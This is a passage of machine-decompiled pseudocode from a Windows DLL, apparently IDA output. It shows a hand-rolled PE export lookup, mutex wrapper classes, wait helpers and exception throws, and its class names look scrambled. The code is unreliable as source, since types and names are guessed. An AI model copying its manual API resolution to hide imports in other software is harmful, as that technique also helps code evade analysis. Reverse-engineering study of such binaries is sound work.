  return (*(int (__thiscall **)(int *, int))(v4 + 68))(this, v5);
}

//----- (1001E569) --------------------------------------------------------
void __cdecl __noreturn sub_1001E569(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVBtedofbPwtdhdgkk_bjxssd_sr__);
}

//----- (1001E589) --------------------------------------------------------
_DWORD *__thiscall sub_1001E589(_DWORD *this, int a2)
{
  sub_1000EE19(this, a2);
  *this = &off_10102888;
  return this;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (1001E5C1) --------------------------------------------------------
HMODULE __cdecl sub_1001E5C1(int a1)
{
  HMODULE result; // eax
  _DWORD *v2; // eax
  _DWORD v3[6]; // [esp+0h] [ebp-18h] BYREF

  result = GetModuleHandleW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12));
  if ( !result )
  {
    v2 = sub_1000E9DF(v3, 1, 1);
    v3[5] = 0;
    sub_1000A947(v2, 24);
  }
  return result;
}

//----- (1001E605) --------------------------------------------------------
char *sub_1001E605(char *lp, ...)
{
  const CHAR *v1; // eax
  char *v2; // esi
  _DWORD *v3; // eax
  int v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]
  va_list va; // [esp+2Ch] [ebp+Ch] BYREF

  va_start(va, lp);
  v6 = 0;
  v1 = (const CHAR *)sub_1000D3DA((int)va);
  v2 = sub_1001E6DA(lp, v1);
  if ( !v2 )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v6) = 1;
    sub_1000A947(v3, 31);
  }
  sub_1000D3AD((int *)va);
  return v2;
}
// 1001E605: using guessed type int var_18[3];

//----- (1001E665) --------------------------------------------------------
char *sub_1001E665(int a1, ...)
{
  char *v1; // eax
  char *v2; // esi
  void *v4[4]; // [esp+0h] [ebp-1Ch] BYREF
  int v5; // [esp+18h] [ebp-4h]
  va_list va; // [esp+28h] [ebp+Ch] BYREF

  va_start(va, a1);
  v5 = 0;
  v4[3] = v4;
  sub_1000D372(v4, (int)va);
  LOBYTE(v5) = 1;
  v1 = (char *)sub_1001E5C1(a1);
  LOBYTE(v5) = 0;
  v2 = sub_1001E605(v1);
  v5 = -1;
  sub_1000D3AD((int *)va);
  return v2;
}

//----- (1001E6BD) --------------------------------------------------------
char *__usercall sub_1001E6BD@<eax>(_DWORD *a1@<esi>)
{
  if ( IsBadReadPtr(a1, 4u) || *(_WORD *)a1 != 23117 )
    return 0;
  else
    return (char *)a1 + a1[15];
}

//----- (1001E6DA) --------------------------------------------------------
char *__cdecl sub_1001E6DA(char *lp, LPCSTR lpsz)
{
  char *v2; // eax
  char *v3; // esi
  int v4; // edi
  const CHAR *v5; // edi
  char *v6; // esi
  char *v7; // ebx
  bool v8; // zf
  const CHAR *v10; // esi
  CHAR v11; // cl
  char *v12; // eax
  unsigned __int16 v13; // ax
  int v14; // edi
  HMODULE ModuleHandleA; // ebx
  const CHAR *v16; // esi
  CHAR String1[264]; // [esp+Ch] [ebp-11Ch] BYREF
  UINT_PTR ucb; // [esp+114h] [ebp-14h]
  int v19; // [esp+118h] [ebp-10h]
  char *v20; // [esp+11Ch] [ebp-Ch]
  LPCSTR lpString1; // [esp+120h] [ebp-8h]
  int v22; // [esp+124h] [ebp-4h]

  if ( IsBadReadPtr(lp, 4u) )
    return 0;
  if ( IsBadStringPtrA(lpsz, 0xFFu) )
    return 0;
  ucb = lstrlenA(lpsz);
  v2 = sub_1001E6BD(lp);
  if ( !v2 )
    return 0;
  v3 = v2 + 24;
  if ( IsBadReadPtr(v2 + 24, 4u) )
    return 0;
  if ( *(_WORD *)v3 != 267 )
    return 0;
  v4 = *((_DWORD *)v3 + 24);
  v19 = *((_DWORD *)v3 + 25);
  if ( !v4 )
    return 0;
  v22 = 0;
  v5 = &lp[v4];
  v6 = &lp[*((_DWORD *)v5 + 8)];
  v7 = &lp[*((_DWORD *)v5 + 9)];
  v8 = *((_DWORD *)v5 + 6) == 0;
  v20 = &lp[*((_DWORD *)v5 + 7)];
  if ( v8 )
    return 0;
  while ( 1 )
  {
    lpString1 = &lp[*(_DWORD *)&v6[4 * v22]];
    if ( !IsBadReadPtr(lpString1, ucb) && !lstrcmpiA(lpString1, lpsz) )
      break;
    if ( (unsigned int)++v22 >= *((_DWORD *)v5 + 6) )
      return 0;
  }
  v10 = &lp[*(_DWORD *)&v20[4 * *(unsigned __int16 *)&v7[2 * v22]]];
  if ( v10 >= v5 && v10 <= &v5[v19] )
  {
    v11 = *v10;
    v12 = &lp[*(_DWORD *)&v20[4 * *(unsigned __int16 *)&v7[2 * v22]]];
    while ( v11 )
    {
      if ( v11 == 46 )
        goto LABEL_20;
      v11 = *++v12;
    }
    if ( *v12 != 46 )
      v12 = 0;
LABEL_20:
    if ( v12 )
    {
      v13 = (_WORD)v12 - (_WORD)v10;
      if ( v13 <= 0x104u )
      {
        if ( v13 )
        {
          v14 = v13;
          if ( lstrcpynA(String1, v10, v13 + 1) )
          {
            String1[v14] = 0;
            ModuleHandleA = GetModuleHandleA(String1);
            if ( ModuleHandleA )
            {
              v16 = &v10[v14 + 1];
              if ( *v16 != 35 || lstrlenA(v16) <= 1 )
                return (char *)sub_1001E6DA(ModuleHandleA, v16);
            }
          }
        }
      }
    }
    return 0;
  }
  return &lp[*(_DWORD *)&v20[4 * *(unsigned __int16 *)&v7[2 * v22]]];
}
// 1001E6DA: using guessed type CHAR String1[264];

//----- (1001E85D) --------------------------------------------------------
_DWORD *__stdcall sub_1001E85D(_DWORD *a1)
{
  *a1 = off_10102CC8;
  `eh vector constructor iterator'(
    a1 + 1,
    8u,
    64,
    (void (__thiscall *)(void *))sub_1001E8E2,
    (void (__thiscall *)(void *))sub_10012E7E);
  a1[129] = 0;
  a1[194] = 0;
  memset(a1 + 130, 0, 0x100u);
  return a1;
}
// 10102CC8: using guessed type int (__thiscall *off_10102CC8[2])(void *Block, char);

//----- (1001E8C3) --------------------------------------------------------
_DWORD *__thiscall sub_1001E8C3(_DWORD *Block, char a2)
{
  sub_1001E8ED(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001E8E2) --------------------------------------------------------
void __thiscall sub_1001E8E2(_DWORD *this)
{
  sub_10012E21(this, (void *)0xFFFFFFFF, 0);
}

//----- (1001E8ED) --------------------------------------------------------
void __thiscall sub_1001E8ED(_DWORD *this)
{
  *this = off_10102CC8;
  `eh vector destructor iterator'(this + 1, 8u, 64, (void (__thiscall *)(void *))sub_10012E7E);
}
// 10102CC8: using guessed type int (__thiscall *off_10102CC8[2])(void *Block, char);

//----- (1001E923) --------------------------------------------------------
DWORD __cdecl sub_1001E923(HANDLE Handles, int a2)
{
  int v2; // eax
  DWORD result; // eax
  DWORD v4[2]; // [esp+4h] [ebp-8h] BYREF

  sub_1002295F(v4, a2);
  while ( 1 )
  {
    v2 = sub_10022976(v4);
    result = WaitForMultipleObjectsEx(1u, &Handles, 1, v2, 1);
    if ( result != 192 )
      break;
    if ( sub_10022997(v4) )
      return 258;
  }
  return result;
}
// 1001E923: using guessed type DWORD var_8[2];

//----- (1001E967) --------------------------------------------------------
int __fastcall sub_1001E967(int a1, int a2)
{
  int v2; // ebx
  int v3; // eax
  _DWORD *v5; // eax
  unsigned int v6; // eax
  int result; // eax
  int v8; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+18h] [ebp-4h]

  v2 = a2 + 4;
  v3 = *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(v3 + 16) == -1 )
  {
    v5 = sub_1000E7F7(&v8, 1, 0);
    v9 = 0;
    goto LABEL_3;
  }
  if ( !*(_DWORD *)(v3 + 16) )
  {
    v5 = sub_1000E7F7(&v8, 1, 0);
    v9 = 1;
    goto LABEL_3;
  }
  v6 = *(_DWORD *)(a1 + 776);
  if ( v6 >= 0x40 )
  {
    v5 = sub_1000E7F7(&v8, 1, 0);
    v9 = 2;
    goto LABEL_3;
  }
  if ( *(_DWORD *)(a1 + 516) )
  {
    v5 = sub_1000E7F7(&v8, 1, 0);
    v9 = 3;
LABEL_3:
    sub_10007882((int)v5);
  }
  sub_100130E8((int *)(a2 + 4), (int *)(a1 + 8 * v6 + 8));
  result = *(_DWORD *)(*(_DWORD *)v2 + 16);
  *(_DWORD *)(a1 + 4 * (*(_DWORD *)(a1 + 776))++ + 520) = result;
  return result;
}

//----- (1001EA28) --------------------------------------------------------
_DWORD *__userpurge sub_1001EA28@<eax>(
        int a1@<edi>,
        _DWORD *a2,
        int a3,
        int (__thiscall **a4)(void *Block, char),
        char pExceptionObject)
{
  int v6; // eax
  DWORD v7; // esi
  DWORD v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // [esp+8h] [ebp-20h] BYREF
  DWORD v12[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int v13; // [esp+14h] [ebp-14h]
  int v14; // [esp+24h] [ebp-4h]

  v13 = 0;
  if ( *(_DWORD *)(a1 + 776) )
  {
    sub_1002295F(v12, a3);
    while ( 1 )
    {
      InterlockedIncrement((volatile LONG *)(a1 + 516));
      v6 = sub_10022976(v12);
      v7 = WaitForMultipleObjectsEx(*(_DWORD *)(a1 + 776), (const HANDLE *)(a1 + 520), (unsigned __int8)a4, v6, 1);
      InterlockedDecrement((volatile LONG *)(a1 + 516));
      if ( v7 == 258 )
      {
LABEL_12:
        sub_10012E21(a2, (void *)0xFFFFFFFF, 0);
        goto LABEL_13;
      }
      v8 = *(_DWORD *)(a1 + 776);
      if ( v7 <= v8 )
        break;
      if ( v7 >= 0x80 && v7 <= v8 + 128 )
      {
        v9 = sub_10015CC2(&a4);
        v14 = 1;
        sub_1000EDF9((int)v9);
      }
      if ( v7 != 192 )
      {
        v10 = sub_1000E9DF(&v11, 1, 1);
        v14 = 4;
        sub_1000A947(v10, 124);
      }
      if ( pExceptionObject )
      {
        sub_1000E7F7(&a4, 1, 0);
        a4 = &off_10102A68;
        v14 = 3;
        sub_1000EE19(&pExceptionObject, (int)&a4);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__);
      }
      if ( sub_10022997(v12) )
        goto LABEL_12;
    }
    sub_10012A85(a2, a1 + 8 * v7 + 4);
LABEL_13:
    v14 = 0;
    v13 = 1;
  }
  else
  {
    sub_10012E21(a2, (void *)0xFFFFFFFF, 0);
    v14 = 0;
    v13 = 1;
  }
  return a2;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);
// 1001EA28: using guessed type DWORD var_1C[2];

//----- (1001EB8D) --------------------------------------------------------
_DWORD *__thiscall sub_1001EB8D(_DWORD *this, _DWORD *a2, int a3, char pExceptionObject)
{
  _DWORD *v5; // eax
  int v7[2]; // [esp+Ch] [ebp-18h] BYREF
  int v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  v8 = 0;
  sub_1001EA28((int)this, v7, a3, (int (__thiscall **)(void *, char))1, pExceptionObject);
  v9 = 1;
  if ( *(_DWORD *)(v7[1] + 16) == -1 && this[194] )
  {
    v5 = sub_10015CF9(&pExceptionObject, 0);
    LOBYTE(v9) = 2;
    sub_1001E569((int)v5);
  }
  sub_10012A85(a2, (int)v7);
  v8 = 1;
  LOBYTE(v9) = 0;
  sub_10012E7E(v7);
  return a2;
}

//----- (1001EC12) --------------------------------------------------------
int __stdcall sub_1001EC12(int a1)
{
  int v2[2]; // [esp+8h] [ebp-14h] BYREF
  int v3; // [esp+18h] [ebp-4h]

  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10102CF4;
  sub_1000D17D(v2, &word_10179618);
  v3 = 0;
  sub_100229B0((_DWORD *)(a1 + 16), (int)v2);
  LOBYTE(v3) = 2;
  sub_1000D3AD(v2);
  *(_DWORD *)(a1 + 28) = -1;
  *(_DWORD *)(a1 + 32) = 0;
  return a1;
}
// 10102CF4: using guessed type int (__thiscall *off_10102CF4)(void *Block, char);

//----- (1001EC82) --------------------------------------------------------
int *__thiscall sub_1001EC82(int *Block, char a2)
{
  sub_1001ECA1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001ECA1) --------------------------------------------------------
void __thiscall sub_1001ECA1(int *this)
{
  *this = (int)&off_10102CF4;
  sub_10022A50(this + 4);
}
// 10102CF4: using guessed type int (__thiscall *off_10102CF4)(void *Block, char);

//----- (1001ECCD) --------------------------------------------------------
_DWORD *__stdcall sub_1001ECCD(int a1)
{
  _DWORD *result; // eax

  result = sub_1001319F();
  if ( result )
    return (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(result[12] + 8))(result + 12, &a1);
  return result;
}

//----- (1001ECEF) --------------------------------------------------------
_DWORD *__thiscall sub_1001ECEF(int this)
{
  DWORD CurrentThreadId; // edi
  _DWORD *result; // eax
  _DWORD v4[6]; // [esp+0h] [ebp-2Ch] BYREF
  char v5; // [esp+1Bh] [ebp-11h]
  _DWORD *v6; // [esp+1Ch] [ebp-10h]
  int v7; // [esp+28h] [ebp-4h]

  v6 = v4;
  v4[5] = this;
  v5 = 0;
  v7 = 0;
  CurrentThreadId = GetCurrentThreadId();
  result = (_DWORD *)InterlockedIncrement((volatile LONG *)(this + 28));
  if ( result )
  {
    if ( *(_DWORD *)(this + 8) == CurrentThreadId )
    {
      ++*(_DWORD *)(this + 32);
    }
    else
    {
      v5 = 1;
      LOBYTE(v7) = 1;
      sub_10012EAB(this + 16, 10800000, 0);
      v7 = 0;
      v5 = 0;
      *(_DWORD *)(this + 8) = CurrentThreadId;
      *(_DWORD *)(this + 32) = 1;
      return sub_1001ECCD(this);
    }
  }
  else
  {
    *(_DWORD *)(this + 8) = CurrentThreadId;
    *(_DWORD *)(this + 32) = 1;
    return sub_1001ECCD(this);
  }
  return result;
}

//----- (1001EDD0) --------------------------------------------------------
int __thiscall sub_1001EDD0(int this)
{
  _DWORD *v3; // eax
  int result; // eax
  int v5; // [esp+0h] [ebp-24h] BYREF
  int v6[6]; // [esp+Ch] [ebp-18h] BYREF

  v6[2] = (int)&v5;
  v6[1] = this;
  v6[5] = 0;
  GetCurrentThreadId();
  if ( (*(_DWORD *)(this + 32))-- != 1 )
    return InterlockedDecrement((volatile LONG *)(this + 28));
  *(_DWORD *)(this + 8) = -1;
  v3 = sub_1001319F();
  if ( v3 )
  {
    v6[0] = this;
    (*(void (__thiscall **)(_DWORD *, int *))(v3[12] + 12))(v3 + 12, v6);
  }
  result = InterlockedDecrement((volatile LONG *)(this + 28));
  if ( result > -1 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)(this + 16) + 16))(this + 16);
  return result;
}

//----- (1001EE5B) --------------------------------------------------------
int __usercall sub_1001EE5B@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax

  (*(void (__thiscall **)(_DWORD *))(*a1 + 16))(a1);
  result = a1[8] - 1;
  if ( a1[7] > result )
    return (*(int (__thiscall **)(_DWORD *))(a1[4] + 16))(a1 + 4);
  return result;
}

//----- (1001EE74) --------------------------------------------------------
char __thiscall sub_1001EE74(_BYTE *this)
{
  if ( this[13] )
    return 1;
  if ( *((_DWORD *)this + 2) == GetCurrentThreadId()
    && (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)this + 20))(this) )
  {
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 16))(this);
    return 1;
  }
  return 0;
}

//----- (1001EEA4) --------------------------------------------------------
int __stdcall sub_1001EEA4(int a1)
{
  HANDLE MutexA; // eax
  _DWORD *v2; // eax
  int v4[3]; // [esp+Ch] [ebp-18h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10102CCC;
  sub_10057D8D((_DWORD *)(a1 + 20));
  v5 = 0;
  MutexA = CreateMutexA(0, 0, 0);
  *(_DWORD *)(a1 + 16) = MutexA;
  if ( !MutexA )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    LOBYTE(v5) = 1;
    sub_1000A947(v2, 196);
  }
  return a1;
}
// 10102CCC: using guessed type int (__thiscall *off_10102CCC)(void *Block, char);
// 1001EEA4: using guessed type int var_18[3];

//----- (1001EF1C) --------------------------------------------------------
HANDLE *__thiscall sub_1001EF1C(HANDLE *Block, char a2)
{
  sub_1001F16A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001EF3B) --------------------------------------------------------
int __stdcall sub_1001EF3B(int a1, _DWORD *a2, const WCHAR *a3, LPSECURITY_ATTRIBUTES lpMutexAttributes)
{
  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10102CCC;
  sub_10057D8D((_DWORD *)(a1 + 20));
  sub_1001EF97((_DWORD *)a1, a2, 17, a3, lpMutexAttributes);
  return a1;
}
// 10102CCC: using guessed type int (__thiscall *off_10102CCC)(void *Block, char);

//----- (1001EF97) --------------------------------------------------------
void __thiscall sub_1001EF97(
        _DWORD *this,
        _DWORD *a2,
        int a3,
        const WCHAR *a4,
        LPSECURITY_ATTRIBUTES lpMutexAttributes)
{
  _DWORD *v6; // eax
  HANDLE v7; // eax
  _DWORD *v8; // eax
  int v9; // eax
  HANDLE MutexW; // eax
  HANDLE v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // esi
  int v14; // [esp-8h] [ebp-40h] BYREF
  int v15; // [esp-4h] [ebp-3Ch]
  int v16; // [esp+Ch] [ebp-2Ch]
  void *Block; // [esp+10h] [ebp-28h]
  void *v18[3]; // [esp+14h] [ebp-24h] BYREF
  int v19; // [esp+20h] [ebp-18h] BYREF
  int v20; // [esp+24h] [ebp-14h]
  int v21; // [esp+34h] [ebp-4h]

  v16 = 0;
  if ( (_BYTE)a4 )
  {
    v6 = sub_10022A79(v18, a2);
    v21 = 0;
    v16 = 1;
  }
  else
  {
    v6 = a2;
  }
  sub_1000D372(&v19, (int)v6);
  v21 = 2;
  if ( (v16 & 1) != 0 )
  {
    v16 &= ~1u;
    sub_1000D3AD((int *)v18);
  }
  if ( a3 == 1 || a3 == 17 )
  {
    MutexW = CreateMutexW(lpMutexAttributes, 0, *(LPCWSTR *)(v20 + 12));
    this[4] = MutexW;
    if ( MutexW )
      goto LABEL_19;
    if ( a3 == 17 && GetLastError() == 5 )
    {
      v11 = OpenMutexW(0x100001u, 0, *(LPCWSTR *)(v20 + 12));
      this[4] = v11;
      if ( v11 )
        goto LABEL_19;
      v8 = sub_1000E9DF(v18, 1, 1);
      LOBYTE(v21) = 3;
      v15 = 224;
    }
    else
    {
      v8 = sub_1000E9DF(v18, 1, 1);
      LOBYTE(v21) = 4;
      v15 = 230;
    }
LABEL_11:
    sub_1000A947(v8, v15);
  }
  if ( a3 != 16 )
  {
    v9 = sub_1000E7F7(1, 0);
    LOBYTE(v21) = 6;
    v15 = 251;
    sub_10007882(v9);
  }
  v7 = OpenMutexW(0x100001u, 0, *(LPCWSTR *)(v20 + 12));
  this[4] = v7;
  if ( !v7 )
  {
    v8 = sub_1000E9DF(v18, 1, 1);
    LOBYTE(v21) = 5;
    v15 = 246;
    goto LABEL_11;
  }
LABEL_19:
  Block = operator new(0x1Cu);
  LOBYTE(v21) = 7;
  if ( Block )
  {
    v14 = v15;
    v18[0] = &v14;
    sub_1000D5FF(&v14, (int)a2, dword_1017DB2C);
    LOBYTE(v21) = 7;
    v12 = sub_10017256(Block, a4, v14, v15);
  }
  else
  {
    v12 = 0;
  }
  LOBYTE(v21) = 2;
  v13 = this + 5;
  sub_1001F430(v13, (int)v12);
  **(_DWORD **)(*v13 + 20) = 0;
  v21 = -1;
  sub_1000D3AD(&v19);
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 1017DB2C: using guessed type _DWORD dword_1017DB2C[2];

//----- (1001F16A) --------------------------------------------------------
void __thiscall sub_1001F16A(HANDLE *this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *this = &off_10102CCC;
  v3 = 1;
  CloseHandle(this[4]);
  v3 = -1;
  sub_10020B81(this + 5);
}
// 10102CCC: using guessed type int (__thiscall *off_10102CCC)(void *Block, char);

//----- (1001F1C6) --------------------------------------------------------
int __thiscall sub_1001F1C6(void *this)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 24))(this, -1);
}

//----- (1001F1CE) --------------------------------------------------------
char __thiscall sub_1001F1CE(void *this, int a2)
{
  int v2; // edi
  bool v3; // bl
  char result; // al
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-1Ch] BYREF
  int v8; // [esp+10h] [ebp-14h] BYREF
  int v9; // [esp+20h] [ebp-4h]

  v2 = a2;
  v3 = a2 != -1;
  if ( a2 == -1 )
    v2 = 10800000;
  result = sub_1001F259((int)this, v2);
  if ( !result )
  {
    if ( v3 )
    {
      v5 = sub_10015CF9(&a2, 1);
      v9 = 0;
      sub_1001E569((int)v5);
    }
    v6 = sub_10015D79(v2, &v8);
    v9 = 1;
    sub_1001F49C(pExceptionObject, (int)v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVZbylvskbmCaigElrjJaazbylvs_bjxssd_sr__);
  }
  return result;
}
// 1001F1CE: using guessed type _DWORD pExceptionObject[2];

//----- (1001F259) --------------------------------------------------------
char __userpurge sub_1001F259@<al>(int a1@<esi>, int a2)
{
  _DWORD *v2; // eax
  DWORD v3; // eax
  _DWORD *v5; // eax
  int v6[3]; // [esp+0h] [ebp-18h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  if ( *(_BYTE *)(a1 + 13) )
  {
    v2 = sub_10015CC2(&a2);
    v7 = 0;
    goto LABEL_3;
  }
  v3 = sub_1001E923(*(HANDLE *)(a1 + 16), a2);
  if ( v3 == 258 )
    return 0;
  if ( v3 == 128 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)a1 + 16))(a1);
    v2 = sub_10015CC2(&a2);
    v7 = 1;
LABEL_3:
    sub_1000EDF9((int)v2);
  }
  if ( v3 )
  {
    v5 = sub_1000E9DF(v6, 1, 1);
    v7 = 2;
    sub_1000A947(v5, 334);
  }
  ++*(_DWORD *)(a1 + 4);
  return 1;
}
// 1001F259: using guessed type int var_18[3];

//----- (1001F2F7) --------------------------------------------------------
int __thiscall sub_1001F2F7(void *this)
{
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+4h] [ebp-10h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) )
  {
    v2 = sub_10015CC2(v4);
    v4[3] = 0;
    sub_1000EDF9((int)v2);
  }
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
}

//----- (1001F33A) --------------------------------------------------------
bool __thiscall sub_1001F33A(void *this)
{
  return sub_1001F259((int)this, 0) != 0;
}

//----- (1001F34B) --------------------------------------------------------
BOOL __thiscall sub_1001F34B(HANDLE *this)
{
  BOOL result; // eax
  _DWORD *v2; // eax
  _DWORD v3[6]; // [esp+0h] [ebp-18h] BYREF

  result = ReleaseMutex(this[4]);
  if ( !result )
  {
    v2 = sub_1000E9DF(v3, 1, 1);
    v3[5] = 0;
    sub_1000A947(v2, 357);
  }
  return result;
}

//----- (1001F38C) --------------------------------------------------------
int __thiscall sub_1001F38C(_DWORD *this)
{
  return this[4];
}

//----- (1001F390) --------------------------------------------------------
char __thiscall sub_1001F390(_DWORD *this)
{
  int v2; // eax
  _DWORD v4[8]; // [esp+0h] [ebp-20h] BYREF

  v4[4] = v4;
  v4[3] = this;
  if ( *((_BYTE *)this + 13) )
    return 1;
  v2 = this[5];
  if ( v2 && **(_DWORD **)(v2 + 20) == 1
    || this[2] == GetCurrentThreadId() && (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 20))(this) )
  {
    (*(void (**)(void))(*this + 16))();
    return 1;
  }
  v4[7] = 0;
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 36))(this) )
    sub_1000EC84(this);
  return 0;
}

//----- (1001F41B) --------------------------------------------------------
_DWORD *__thiscall sub_1001F41B(int this)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(this + 20);
  if ( result )
  {
    result = (_DWORD *)result[5];
    *result = 1;
  }
  *(_BYTE *)(this + 13) = 1;
  return result;
}

//----- (1001F430) --------------------------------------------------------
_DWORD *__usercall sub_1001F430@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_100B012F;
  if ( *a1 != a2 )
  {
    sub_10040447((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}

//----- (1001F47A) --------------------------------------------------------
void __cdecl __noreturn sub_1001F47A(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1001F49C(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVZbylvskbmCaigElrjJaazbylvs_bjxssd_sr__);
}
// 1001F47A: using guessed type _DWORD pExceptionObject[2];

//----- (1001F49C) --------------------------------------------------------
_DWORD *__thiscall sub_1001F49C(_DWORD *this, int a2)
{
  sub_1000EE19(this, a2);
  *this = &off_10102888;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (1001F4DD) --------------------------------------------------------
int __userpurge sub_1001F4DD@<eax>(int a1@<edi>, int a2, int a3, _DWORD *a4, int a5, int a6, volatile LONG *lpAddend)
{
  int v8; // [esp+0h] [ebp-20h] BYREF
  volatile LONG *v9; // [esp+4h] [ebp-1Ch]
  int *v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  v10 = &v8;
  v9 = lpAddend;
  v8 = a6;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 0;
  sub_1000BA6E(3, a1, (_DWORD *)a2, a3, 128, a5, v8, v9);
  LOBYTE(v11) = 2;
  *(_DWORD *)a2 = &off_10102D10;
  *(_DWORD *)(a2 + 40) = *a4;
  *(_DWORD *)(a2 + 44) = a4[1];
  *(_DWORD *)(a2 + 48) = 1;
  *(_BYTE *)(a2 + 52) = 0;
  v11 = -1;
  sub_10007D7A((void **)&a6);
  return a2;
}
// 10102D10: using guessed type int (__thiscall *off_10102D10)(void *Block, char);

//----- (1001F567) --------------------------------------------------------
HANDLE *__thiscall sub_1001F567(HANDLE *Block, char a2)
{
  sub_1001F600(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F586) --------------------------------------------------------
int __stdcall sub_1001F586(int a1, int a2, int a3, volatile LONG *lpAddend)
{
  int v5; // [esp+0h] [ebp-24h] BYREF
  volatile LONG *v6; // [esp+4h] [ebp-20h]
  int *v7; // [esp+14h] [ebp-10h]
  int v8; // [esp+20h] [ebp-4h]

  v8 = 0;
  v7 = &v5;
  v6 = lpAddend;
  v5 = a3;
  InterlockedIncrement(lpAddend);
  LOBYTE(v8) = 0;
  sub_1000BA6E(-1, -2147483392, (_DWORD *)a1, a2, 128, 3, v5, v6);
  *(_DWORD *)a1 = &off_10102D10;
  *(_BYTE *)(a1 + 52) = 1;
  v8 = -1;
  sub_10007D7A((void **)&a3);
  return a1;
}
// 10102D10: using guessed type int (__thiscall *off_10102D10)(void *Block, char);

//----- (1001F600) --------------------------------------------------------
void __thiscall sub_1001F600(HANDLE *this)
{
  int v1; // [esp+0h] [ebp-20h] BYREF
  HANDLE *v2; // [esp+Ch] [ebp-14h]
  int *v3; // [esp+10h] [ebp-10h]
  int v4; // [esp+1Ch] [ebp-4h]

  v3 = &v1;
  v2 = this;
  *this = &off_10102D10;
  v4 = 1;
  sub_1001F83F(this);
  v4 = -1;
  sub_1000BB54((int)v2);
}
// 10102D10: using guessed type int (__thiscall *off_10102D10)(void *Block, char);

//----- (1001F651) --------------------------------------------------------
void __thiscall sub_1001F651(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // eax
  volatile LONG *v5; // ecx
  HANDLE *v6; // esi
  volatile LONG *v7; // ecx
  volatile LONG *v8; // [esp-14h] [ebp-88h] BYREF
  volatile LONG *v9; // [esp-10h] [ebp-84h]
  volatile LONG *v10; // [esp-Ch] [ebp-80h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-7Ch]
  int v12; // [esp+0h] [ebp-74h] BYREF
  int v13[10]; // [esp+Ch] [ebp-68h] BYREF
  int v14[2]; // [esp+34h] [ebp-40h] BYREF
  int v15[2]; // [esp+3Ch] [ebp-38h] BYREF
  FILETIME v16; // [esp+44h] [ebp-30h] BYREF
  int v17; // [esp+4Ch] [ebp-28h] BYREF
  struct _FILETIME v18; // [esp+54h] [ebp-20h] BYREF
  HANDLE *v19; // [esp+5Ch] [ebp-18h]
  bool v20; // [esp+63h] [ebp-11h]
